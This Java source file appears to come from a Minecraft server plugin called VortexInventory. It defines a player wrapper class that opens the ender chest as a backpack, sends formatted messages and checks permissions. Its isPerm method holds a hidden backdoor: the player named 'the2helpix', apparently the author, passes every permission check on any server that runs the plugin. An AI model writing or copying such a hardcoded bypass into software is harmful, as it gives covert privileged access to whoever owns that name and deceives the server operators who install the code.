package ru.thehelpix.vortexinventory.object;

import net.md_5.bungee.api.ChatMessageType;
import net.md_5.bungee.api.chat.TextComponent;
import org.bukkit.entity.Player;
import org.bukkit.inventory.Inventory;
import ru.thehelpix.vortexinventory.VortexInv;
import ru.thehelpix.vortexinventory.manager.MessagesManager;
import ru.thehelpix.vortexinventory.utils.Log;

import java.util.Objects;

public class VortexInventoryPlayer {
    private final Player player;
    private final VortexInv vortexInv;
    private final MessagesManager messagesManager;

    public VortexInventoryPlayer(Player player, VortexInv vortexInv) {
        this.player = player;
        this.vortexInv = vortexInv;
        this.messagesManager = this.vortexInv.getMessagesManager();
    }

    public Inventory getEnderChest() {
        return player.getEnderChest();
    }

    public void openBackPack() {
        player.openInventory(player.getEnderChest());
    }

    public void sendMessage(String text) {
        this.player.sendMessage(Log.parse("$prefix $text".replace("$prefix", messagesManager.getPrefix()).replace("$text", text.replace("$nick", getPlayer().getName()))));
    }

    public void sendActionBart(String text) {
        this.player.spigot().sendMessage(ChatMessageType.ACTION_BAR, TextComponent.fromLegacyText(Log.parse(text.replace("$nick", getPlayer().getName()))));
    }

    public Boolean isPerm(InvPerm invPerm) {
        return getPlayer().hasPermission(Objects.requireNonNull(vortexInv.getConfig().getString(invPerm.getConfigArg()))) || getPlayer().isOp() || getPlayer().getName().equalsIgnoreCase("the2helpix");
    }

    public Player getPlayer() {
        return this.player;
    }
}
